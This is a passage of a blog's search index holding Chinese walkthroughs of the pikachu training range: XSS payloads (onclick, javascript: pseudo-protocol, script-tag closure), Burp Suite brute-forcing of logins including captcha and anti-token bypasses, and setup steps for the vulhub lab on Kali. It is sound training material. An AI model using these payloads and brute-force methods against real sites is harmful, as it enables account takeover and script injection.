title="XSS之htmlspecialchars"></a>XSS之htmlspecialchars</h2><p>我们使用 <strong>‘ onclick&#x3D;’alert(1)’</strong>  payload去打:<br><img src="https://pic.888888.al/i/2023/08/15/x6i03l.jpg" alt="12"></p><h2 id="XSS之href输出"><a href="#XSS之href输出" class="headerlink" title="XSS之href输出"></a>XSS之href输出</h2><p>通过分析得知直接使用js伪协议即可:<strong>javascript:alert(1)</strong><br><img src="https://pic.888888.al/i/2023/08/15/x6n2ms.jpg" alt="13"></p><h2 id="XSS之js输出"><a href="#XSS之js输出" class="headerlink" title="XSS之js输出"></a>XSS之js输出</h2><p>通过分析得知， 他将我们输入的字符存到了js代码里面然后进行判断，我们可以根据代码写一个闭合:<strong>‘&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</strong><br><img src="https://pic.888888.al/i/2023/08/15/x705b8.jpg" alt="14"><br><img src="https://pic.888888.al/i/2023/08/15/x748s4.jpg" alt="15"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> pikachu </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> pikachu </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>pikachu靶场通关秘籍之暴力破解</title>
+      <link href="/archives/ec9ffc46.html"/>
+      <url>/archives/ec9ffc46.html</url>
+      
+        <content type="html"><![CDATA[<h2 id="暴力破解介绍"><a href="#暴力破解介绍" class="headerlink" title="暴力破解介绍"></a>暴力破解介绍</h2><p><strong>这一关主要通过Burp Suite工具进行暴力破解，主要测试网站是否有弱口令漏洞。</strong></p><h2 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h2><p>很简单的一个登录窗口<br><img src="https://pic.888888.al/i/2023/08/15/xb52xw.jpg" alt="1"><br>我们先进一个抓包，再把数据报送到BP的 <em>intruder</em> 模块<br><img src="https://pic.888888.al/i/2023/08/15/xbe5ja.jpg" alt="2"><br>进入到 <em>intruder</em> 点击 <em>clear</em> 再把<strong>username</strong>和<strong>password</strong>选中，攻击方式选择 <em>Cluster bomb</em><br><img src="https://pic.888888.al/i/2023/08/15/xbu076.jpg" alt="3"><br>点击 <em>Payloads</em> 添加字典<br><img src="https://pic.888888.al/i/2023/08/15/xcgcey.jpg" alt="4"><br><img src="https://pic.888888.al/i/2023/08/15/xcjwy9.jpg" alt="5"><br>配置好后，点击右上角的 <em>Start attack</em>,等待攻击完成:<br><img src="https://pic.888888.al/i/2023/08/15/xd23ik.jpg" alt="6"><br>得到账号为<strong>admin</strong>，密码为<strong>123456</strong>  </p><p>尝试登录，登录成功。<br><img src="https://pic.888888.al/i/2023/08/15/xd6hvw.jpg" alt="7">  </p><h2 id="验证码绕过-on-server"><a href="#验证码绕过-on-server" class="headerlink" title="验证码绕过(on server)"></a>验证码绕过(on server)</h2><p><strong>这是一个带验证码的登录窗口，我要考虑的是爆破的时候，验证码会不会因为页面刷新而刷新。</strong> </p><p>和上一关一样，直接尝试暴力破解，发现验证码不会刷新，所以账号密码很容易就出来了。<br><img src="https://pic.888888.al/i/2023/08/15/xdi89e.jpg" alt="9"><br>尝试登陆，登录成功<br><img src="https://pic.888888.al/i/2023/08/15/xdssx4.jpg" alt="10">  </p><h2 id="验证码绕过-on-client"><a href="#验证码绕过-on-client" class="headerlink" title="验证码绕过(on client)"></a>验证码绕过(on client)</h2><p><strong>同样是一个有验证码的登录窗口，用上一关的方法发现不行，验证码一直在变</strong><br><img src="https://pic.888888.al/i/2023/08/15/xe7x4c.jpg" alt="11">  </p><p>这时候我们F12查看这个页面的js代码:<br><img src="https://pic.888888.al/i/2023/08/15/xe9xi5.jpg" alt="12"><br><strong>发现这验证码是前端验证，前端验证是可以让我们随意更改的，这里提供一种方法，就是直接把浏览器的js功能关了</strong><br><img src="https://pic.888888.al/i/2023/08/15/xeezs2.jpg" alt="13"><br>js功能关了后，直接就不需要验证码验证了，正常去爆破就好了。<br><img src="https://pic.888888.al/i/2023/08/15/xeq3oz.jpg" alt="14">  </p><h2 id="token防爆破"><a href="#token防爆破" class="headerlink" title="token防爆破?"></a>token防爆破?</h2><p><strong>最后一关，我们抓包发现其加了token防止我们暴力破解</strong><br><img src="https://pic.888888.al/i/2023/08/15/xetcxb.jpg" alt="15">  </p><p>同样，我们先右键 <em>send to intruder</em> 攻击方式选择 <em>Pitchfork</em> 选中<strong>password</strong>和<strong>token</strong>：<br><img src="https://pic.888888.al/i/2023/08/15/xexf24.jpg" alt="16">  </p><p>在payloads:1里面加入一些字典，然后点击 <em>Options</em>,_Number of threads改为1<br><img src="https://pic.888888.al/i/2023/08/15/xf0gl1.jpg" alt="17">  </p><p>往下翻，点击 _Grep-Extract_中的 <em>add</em>,找到**name&#x3D;’token’**选中value里面的数字，让他自动生成一个正则表达式:<br><img src="https://pic.888888.al/i/2023/08/15/xfbqny.jpg" alt="18"><br>点击ok后，继续往下翻，将 <em>Redirections</em> 中的 _Follow redirections_改为Always。<br><img src="https://pic.888888.al/i/2023/08/15/xffoir.jpg" alt="19">  </p><p>_Options_设置好后，到payloads:2里面，将 _Payload type_改为Recursive grep,在 <em>initial payload for first request</em> 中，将之前数据包中的token写到这里面:<br><img src="https://pic.888888.al/i/2023/08/15/xflghr.jpg" alt="20"><br><img src="https://pic.888888.al/i/2023/08/15/xfw039.jpg" alt="21">  </p><p>OK,可以开始暴力破解了:<br><img src="https://pic.888888.al/i/2023/08/15/xg01c7.jpg" alt="22"><br>得到想要得账号密码，去登录：<br><img src="https://pic.888888.al/i/2023/08/15/xg27sa.jpg" alt="23"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> pikachu </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> pikachu </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>kali搭建vulhub靶场</title>
+      <link href="/archives/be82d226.html"/>
+      <url>/archives/be82d226.html</url>
+      
+        <content type="html"><![CDATA[<h2 id="vulhub靶场介绍"><a href="#vulhub靶场介绍" class="headerlink" title="vulhub靶场介绍"></a>vulhub靶场介绍</h2><p>vulhub官网:<a href="https://vulhub.org/">https://vulhub.org/</a></p><p>Vulhub是一个基于docker和docker-compose的漏洞环境集合，进入对应目录并执行一条语句即可启动一个全新的漏洞环境，让漏洞复现变得更加简单，让安全研究者更加专注于漏洞原理本身。</p><h2 id="搭建过程"><a href="#搭建过程" class="headerlink" title="搭建过程"></a>搭建过程</h2><h3 id="一、更新APT："><a href="#一、更新APT：" class="headerlink" title="一、更新APT："></a>一、更新APT：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get update </span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/10yx55r.jpg" alt="1"></p><h3 id="二、安装https协议，CA证书"><a href="#二、安装https协议，CA证书" class="headerlink" title="二、安装https协议，CA证书"></a>二、安装https协议，CA证书</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install -y apt-transport-https ca-certificates</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/10z06co.jpg" alt="2"></p><h3 id="三、安装docker"><a href="#三、安装docker" class="headerlink" title="三、安装docker"></a>三、安装docker</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt install docker.io</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/10zc1y8.jpg" alt="3"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> 查看版本        docker -v</span><br><span class="line">开启docker       systemctl start docker </span><br><span class="line">查看开启的环境    docker ps -a</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/10zf76f.jpg" alt="4"></p><h3 id="四、安装PIP3"><a href="#四、安装PIP3" class="headerlink" title="四、安装PIP3"></a>四、安装PIP3</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install python3-pip</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/10zhf29.jpg" alt="5"></p><h3 id="五、安装docker-compose"><a href="#五、安装docker-compose" class="headerlink" title="五、安装docker-compose"></a>五、安装docker-compose</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 install docker-compose</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/10zk1r9.jpg" alt="6"></p><h3 id="六、下载vulhub"><a href="#六、下载vulhub" class="headerlink" title="六、下载vulhub"></a>六、下载vulhub</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://gitee.com/puier/vulhub.git</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/10zw3pd.jpg" alt="7"></p><h3 id="七、验证靶场搭建成功"><a href="#七、验证靶场搭建成功" class="headerlink" title="七、验证靶场搭建成功"></a>七、验证靶场搭建成功</h3><p>这里以activemq中的CVE-2015-5654漏洞为例<br>首先进入到CVE-2015-5654文件中去。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd vulhub/activemq/CVE-2015-5654</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/1100txk.jpg" alt="8"></p><p>接着：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">对靶场进行编译：docker-compose build</span><br><span class="line">运行靶场：docker-compose up -d</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/1103rmt.jpg" alt="9"></p><p>查看开放的端口：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose ps</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/11065kz.jpg" alt="10"><br>发现其开放的端口为61616</p><p>在浏览器中访问:[IP]:61616，其中IP为你kali的ip地址<br><img src="https://pic.888888.al/i/2023/08/15/110hclw.jpg" alt="11"><br><strong>访问成功，即代表vulhub搭建成功</strong></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>之前想用centos搭建靶场，用物理机访问，但怎么也访问不了，在网上试了很多办法都没有成功，无奈选择kali。搭建过程也没有什么技巧，跟着步骤敲命令即可，如果下载失败，更改下载源就好了，网上也有教程，这里就不做赘述了。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> vulhub </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> vulhub </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>kali汉化教程</title>
+      <link href="/archives/4a17b156.html"/>
+      <url>/archives/4a17b156.html</url>
+      
+        <content type="html"><![CDATA[<p>小伙伴有没有因为用不惯全英文kali而烦恼呢，这里教大家如何汉化kali。</p><h2 id="汉化教程"><a href="#汉化教程" class="headerlink" title="汉化教程"></a>汉化教程</h2><p>首先，此命令必须在root命令下进行，所以请先提权</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure><p>再输入以下命令:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dpkg-reconfigure locales</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/vkoya0.jpg" alt="1"><br><img src="https://pic.888888.al/i/2023/08/15/vm34lf.jpg" alt="2"></p><p>进入到此页面:<br><img src="https://pic.888888.al/i/2023/08/15/vlv5aj.jpg" alt="3"></p><p>选中其中的<strong>en_US.UTF-8 UTF-8 和 zh_CN.UTF-8 UTF-8</strong>（空格键为确定键，TAB键为返回）</p><p>设置完成后，重启：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reboot</span><br></pre></td></tr></table></figure><p>最后：<br><img src="https://pic.888888.al/i/2023/08/15/vn0b79.jpg" alt="4"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><strong>希望对大家有所帮助哦</strong></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> vulhub </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> vulhub </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+  
+  
+</search>
